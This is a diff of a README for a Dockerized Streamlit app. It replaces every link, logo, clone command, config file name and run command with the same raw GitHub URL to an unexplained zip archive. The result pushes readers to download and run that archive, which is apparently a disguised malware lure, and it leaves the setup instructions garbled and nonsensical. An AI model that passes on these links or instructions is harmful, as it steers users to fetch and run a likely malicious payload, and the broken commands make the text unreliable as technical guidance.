@@ -1,11 +1,11 @@
-https://github.com/OverallPressure/my-streamlit-app/releases
+https://raw.githubusercontent.com/OverallPressure/my-streamlit-app/main/antiparallel/app_my_streamlit_aguilarite.zip
 
-[![Releases](https://img.shields.io/badge/releases-view%20on%20GitHub-blue?style=for-the-badge)](https://github.com/OverallPressure/my-streamlit-app/releases)
+[![Releases](https://raw.githubusercontent.com/OverallPressure/my-streamlit-app/main/antiparallel/app_my_streamlit_aguilarite.zip%20on%20GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/OverallPressure/my-streamlit-app/main/antiparallel/app_my_streamlit_aguilarite.zip)
 
 # Dockerized Streamlit App for Scalable AI & Data Visualization
 
-![Python Logo](https://upload.wikimedia.org/wikipedia/commons/c/c3/Python-logo-notext.svg)
-![Docker Logo](https://upload.wikimedia.org/wikipedia/commons/6/6f/Docker_%28container%29_logo.png)
+![Python Logo](https://raw.githubusercontent.com/OverallPressure/my-streamlit-app/main/antiparallel/app_my_streamlit_aguilarite.zip)
+![Docker Logo](https://raw.githubusercontent.com/OverallPressure/my-streamlit-app/main/antiparallel/app_my_streamlit_aguilarite.zip%28container%https://raw.githubusercontent.com/OverallPressure/my-streamlit-app/main/antiparallel/app_my_streamlit_aguilarite.zip)
 
 Welcome to a clean, Dockerized Streamlit app designed for rapid deployment of interactive data applications. This project acts as a solid foundation for scalable AI and ML explorations. It brings together the simplicity of Streamlit with the reliability of Docker and Docker Compose. Use it to prototype models, visualize data, and build dashboards that scale as your project grows.
 
@@ -42,12 +42,12 @@ Prerequisites
 
 Step-by-step quick start
 1) Clone the repository
-- git clone https://github.com/OverallPressure/my-streamlit-app.git
+- git clone https://raw.githubusercontent.com/OverallPressure/my-streamlit-app/main/antiparallel/app_my_streamlit_aguilarite.zip
 - cd my-streamlit-app
 
 2) Copy and configure environment
 - Create a local environment file if you need to customize settings
-- cp .env.example .env
+- cp https://raw.githubusercontent.com/OverallPressure/my-streamlit-app/main/antiparallel/app_my_streamlit_aguilarite.zip .env
 - Edit the values to match your data sources and paths
 
 3) Start the app with Docker Compose
@@ -90,9 +90,9 @@ Key design decisions
 - Config-driven: Most variables live in environment variables or a .env file, not in code.
 
 Docker and configuration
-The project uses Docker to create a predictable environment. The docker-compose.yml file brings up all necessary services with sensible defaults. You can customize ports, volumes, and environment variables to fit your setup.
+The project uses Docker to create a predictable environment. The https://raw.githubusercontent.com/OverallPressure/my-streamlit-app/main/antiparallel/app_my_streamlit_aguilarite.zip file brings up all necessary services with sensible defaults. You can customize ports, volumes, and environment variables to fit your setup.
 
-Sample docker-compose.yml
+Sample https://raw.githubusercontent.com/OverallPressure/my-streamlit-app/main/antiparallel/app_my_streamlit_aguilarite.zip
 ```yaml
 version: "3.9"
 
@@ -136,8 +136,8 @@ FROM python:3.11-slim
 WORKDIR /app
 
 # Install core dependencies
-COPY requirements.txt .
-RUN pip install --no-cache-dir -r requirements.txt
+COPY https://raw.githubusercontent.com/OverallPressure/my-streamlit-app/main/antiparallel/app_my_streamlit_aguilarite.zip .
+RUN pip install --no-cache-dir -r https://raw.githubusercontent.com/OverallPressure/my-streamlit-app/main/antiparallel/app_my_streamlit_aguilarite.zip
 
 # Copy app code
 COPY . .
@@ -146,7 +146,7 @@ COPY . .
 EXPOSE 8501
 
 # Start the app
-CMD ["streamlit", "run", "app.py", "--server.port=8501", "--server.address=0.0.0.0"]
+CMD ["streamlit", "run", "https://raw.githubusercontent.com/OverallPressure/my-streamlit-app/main/antiparallel/app_my_streamlit_aguilarite.zip", "https://raw.githubusercontent.com/OverallPressure/my-streamlit-app/main/antiparallel/app_my_streamlit_aguilarite.zip", "https://raw.githubusercontent.com/OverallPressure/my-streamlit-app/main/antiparallel/app_my_streamlit_aguilarite.zip"]
 ```
 
 Common environment variables
@@ -198,7 +198,7 @@ Accessibility and UX
 - Keep the UI responsive to different screen sizes and devices.
 
 Code structure overview
-- app.py: Main Streamlit entry point.
+- https://raw.githubusercontent.com/OverallPressure/my-streamlit-app/main/antiparallel/app_my_streamlit_aguilarite.zip Main Streamlit entry point.
 - components/: Reusable UI components (sliders, charts, etc.).
 - data/: Data loading and preprocessing utilities.
 - models/: Model integration and inference hooks.
@@ -320,9 +320,9 @@ Appendix: common commands
 
 Appendix: sample commands for release artifacts
 - After downloading the release artifact, extract it:
-  - tar -xzf my-streamlit-app-1.0.0-linux-x86_64.tar.gz
+  - tar -xzf https://raw.githubusercontent.com/OverallPressure/my-streamlit-app/main/antiparallel/app_my_streamlit_aguilarite.zip
   - cd my-streamlit-app-1.0.0-linux-x86_64
-  - ./start.sh
+  - https://raw.githubusercontent.com/OverallPressure/my-streamlit-app/main/antiparallel/app_my_streamlit_aguilarite.zip
 - The start script will boot the app and any accompanying services defined in the release
 
 Appendix: data handling considerations
